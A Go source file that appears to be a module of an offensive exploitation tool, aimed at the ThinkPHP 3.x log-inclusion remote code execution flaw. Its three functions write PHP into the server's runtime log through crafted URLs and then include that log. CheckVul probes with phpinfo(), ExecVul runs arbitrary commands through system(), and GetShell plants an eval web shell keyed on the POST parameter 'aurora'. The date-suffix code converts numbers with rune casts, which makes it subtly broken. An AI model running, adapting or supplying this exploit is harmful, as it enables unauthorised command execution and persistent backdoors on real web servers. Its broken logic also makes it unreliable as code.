package thinkphp

import (
	"breach/internal/util"
	"io"
	"net/http"
	"strings"
	"time"
)

type TP3LogRceModule struct {
	BaseUrl            string
	feature            string
	checkVulPayloadUrl []string
	checkStr           string
	suffix1            string
}

func NewTP3LogRceModule(baseUrl string) *TP3LogRceModule {
	now := time.Now()
	year := string(rune(now.Year()))
	month := string(rune(now.Month()))
	day := string(rune(now.Day()))
	suffix1 := year[2:4] + "_" + month + "_" + day + "_" + ".log"
	checkVulPayloadUrl := make([]string, 0)
	p := []string{
		"/?m=Home&c=Index&a=index&value[_filename]=." + "/Application/Runtime/Logs/Home/",
		"/?m=Home&c=Index&a=index&info[_filename]=." + "/Application/Runtime/Logs/Home/",
		"/?m=Home&c=Index&a=index&param[_filename]=." + "/Application/Runtime/Logs/Home/",
		"/?m=Home&c=Index&a=index&name[_filename]=." + "/Application/Runtime/Logs/Home/",
		"/?m=Home&c=Index&a=index&array[_filename]=." + "/Application/Runtime/Logs/Home/",
		"/?m=Home&c=Index&a=index&arr[_filename]=." + "/Application/Runtime/Logs/Home/",
		"/?m=Home&c=Index&a=index&list[_filename]=." + "/Application/Runtime/Logs/Home/",
		"/?m=Home&c=Index&a=index&page[_filename]=." + "/Application/Runtime/Logs/Home/",
		"/?m=Home&c=Index&a=index&menus[_filename]=." + "/Application/Runtime/Logs/Home/",
		"/?m=Home&c=Index&a=index&var[_filename]=." + "/Application/Runtime/Logs/Home/",
		"/?m=Home&c=Index&a=index&data[_filename]=." + "/Application/Runtime/Logs/Home/",
		"/?m=Home&c=Index&a=index&module[_filename]=." + "/Application/Runtime/Logs/Home/",
	}
	for _, s := range p {
		checkVulPayloadUrl = append(checkVulPayloadUrl, baseUrl+s+"/"+suffix1)
	}
	return &TP3LogRceModule{
		BaseUrl:            baseUrl,
		feature:            "ThinkPHP 3.x Log RCE",
		checkVulPayloadUrl: checkVulPayloadUrl,
		checkStr:           "PHP Version",
		suffix1:            suffix1,
	}
}

func (t *TP3LogRceModule) CheckVul() *util.Response {
	payloadLog := t.BaseUrl + "?m=Home&c=Index&a=index&test=--><?=phpinfo();?>"
	for _, payloadUrl := range t.checkVulPayloadUrl {
		_, err := http.Get(payloadLog)
		if err != nil {
			return util.Fail(err.Error())
		}
		resp, err := http.Get(payloadUrl)
		if err != nil {
			return util.Fail(err.Error())
		}

		bytes, err := io.ReadAll(resp.Body)
		if err != nil {
			return util.Fail(err.Error())
		}
		if strings.Contains(string(bytes), t.checkStr) {
			return util.Success("ThinkPHP 3.x Log RCE", payloadUrl)
		}
	}
	return util.Fail("no vulnerable")
}

func (t *TP3LogRceModule) ExecVul(cmd string) *util.Response {
	logExec := t.BaseUrl + "/?m=Home&c=Index&a=index&test=--><?=system('" + cmd + "');?>"
	logRes := t.BaseUrl + "/?m=Home&c=Index&a=index&value[_filename]=." + "/Application/Runtime/Logs/Home/" + t.suffix1
	_, err := http.Get(logExec)
	if err != nil {
		return util.Fail(err.Error())
	}
	resp, err := http.Get(logRes)
	if err != nil {
		return util.Fail(err.Error())
	}
	if resp.StatusCode == 200 {
		return util.Success("ThinkPHP 3.x Log RCE", logRes)
	}
	return util.Fail("no vulnerable")
}

func (t *TP3LogRceModule) GetShell() *util.Response {
	logShell := t.BaseUrl + "/?m=Home&c=Index&a=index&test=--><?=@eval($_POST['aurora']);?>"
	logRes := t.BaseUrl + "/?m=Home&c=Index&a=index&value[_filename]=." + "/Application/Runtime/Logs/Home/" + t.suffix1
	_, err := http.Get(logShell)
	if err != nil {
		return util.Fail(err.Error())
	}
	resp, err := http.Get(logRes)
	if err != nil {
		return util.Fail(err.Error())
	}
	if resp.StatusCode == 200 {
		return util.Success("ThinkPHP 3.x Log RCE", logRes)
	}
	return util.Fail("no vulnerable")
}
